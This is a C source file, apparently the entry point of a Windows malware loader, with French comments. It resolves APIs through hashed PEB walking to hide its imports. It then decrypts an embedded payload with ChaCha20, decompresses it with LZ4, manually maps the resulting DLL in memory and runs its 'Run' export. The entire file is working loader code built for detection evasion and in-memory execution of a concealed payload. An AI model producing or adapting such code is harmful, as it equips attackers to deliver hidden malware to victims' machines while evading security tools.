#include "../include/types.h"
#include "../include/peb.h"
#include "../include/hash.h"
#include "../include/chacha20.h"
#include "../include/lz4.h"
#include "../include/loader.h"
#include "../include/payload.h"

/* =============================================
 * entry.c — Point d'entree no-CRT
 *
 * Pipeline :
 *   1. Resoudre les API via PEB walking
 *   2. Dechiffrer le payload (ChaCha20)
 *   3. Decompresser (LZ4)
 *   4. Manual map la DLL
 *   5. Appeler l'export "Run"
 * ============================================= */

/* Prototypes peb.c */
extern PVOID peb_resolve_api(DWORD module_hash, DWORD function_hash);
extern PVOID peb_find_export(PVOID module_base, DWORD function_hash);

/* Hash de l'export "Run" dans le loader DLL */
#define HASH_RUN 0x0B881F3A  /* djb2_hash_a("Run") */

/* Typedef pour l'export Run() */
typedef void (*fn_Run)(void);

static API_TABLE api;

/* =============================================
 * resolve_apis — Resout toutes les API necessaires
 * via PEB walking + DJB2 hash
 * ============================================= */
static BOOL resolve_apis(void) {
    api.GetProcAddress       = (fn_GetProcAddress)       peb_resolve_api(HASH_KERNEL32_DLL, HASH_GETPROCADDRESS);
    api.LoadLibraryA         = (fn_LoadLibraryA)         peb_resolve_api(HASH_KERNEL32_DLL, HASH_LOADLIBRARYA);
    api.VirtualAlloc         = (fn_VirtualAlloc)         peb_resolve_api(HASH_KERNEL32_DLL, HASH_VIRTUALALLOC);
    api.VirtualProtect       = (fn_VirtualProtect)       peb_resolve_api(HASH_KERNEL32_DLL, HASH_VIRTUALPROTECT);
    api.VirtualFree          = (fn_VirtualFree)          peb_resolve_api(HASH_KERNEL32_DLL, HASH_VIRTUALFREE);
    api.ExitProcess          = (fn_ExitProcess)          peb_resolve_api(HASH_KERNEL32_DLL, HASH_EXITPROCESS);
    api.FlushInstructionCache = (fn_FlushInstructionCache) peb_resolve_api(HASH_KERNEL32_DLL, HASH_FLUSHINSTRUCTIONCACHE);
    api.RtlAddFunctionTable   = (fn_RtlAddFunctionTable)  peb_resolve_api(HASH_KERNEL32_DLL, HASH_RTLADDFUNCTIONTABLE);

    if (!api.GetProcAddress  || !api.LoadLibraryA    ||
        !api.VirtualAlloc   || !api.VirtualProtect  ||
        !api.VirtualFree    || !api.ExitProcess      ||
        !api.FlushInstructionCache || !api.RtlAddFunctionTable)
        return FALSE;

    return TRUE;
}

/* =============================================
 * Entry — Custom entry point (pas de main/WinMain)
 * ============================================= */
void Entry(void) {
    BYTE* decrypted;
    BYTE* decompressed;
    PVOID mapped;
    fn_Run run;
    int lz4_result;

    /* --- 1. Resoudre les API Windows via PEB --- */
    if (!resolve_apis()) {
        __asm__ volatile ("int3");
        for (;;);
    }

    /* --- 2. Allouer + dechiffrer le payload (ChaCha20) --- */
    decrypted = (BYTE*)api.VirtualAlloc(
        NULL, PAYLOAD_ENCRYPTED_SIZE,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!decrypted)
        api.ExitProcess(1);

    {
        DWORD i;
        for (i = 0; i < PAYLOAD_ENCRYPTED_SIZE; i++)
            decrypted[i] = payload_data[i];
    }
    chacha20_crypt(decrypted, PAYLOAD_ENCRYPTED_SIZE,
                   payload_key, payload_nonce, 0);

    /* --- 3. Decompresser (LZ4) --- */
    decompressed = (BYTE*)api.VirtualAlloc(
        NULL, PAYLOAD_ORIGINAL_SIZE,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!decompressed)
        api.ExitProcess(2);

    lz4_result = lz4_decompress(
        decrypted, PAYLOAD_COMPRESSED_SIZE,
        decompressed, PAYLOAD_ORIGINAL_SIZE
    );
    if (lz4_result < 0)
        api.ExitProcess(3);

    /* Liberer le buffer chiffre — plus besoin */
    api.VirtualFree(decrypted, 0, MEM_RELEASE);

    /* --- 4. Manual map la DLL --- */
    mapped = pe_load(decompressed, &api);
    if (!mapped)
        api.ExitProcess(4);

    /* Liberer le buffer decompresse — copie dans l'image mappee */
    api.VirtualFree(decompressed, 0, MEM_RELEASE);

    /* --- 5. Trouver et appeler Run() --- */
    run = (fn_Run)peb_find_export(mapped, HASH_RUN);
    if (run)
        run();

    api.ExitProcess(0);
}
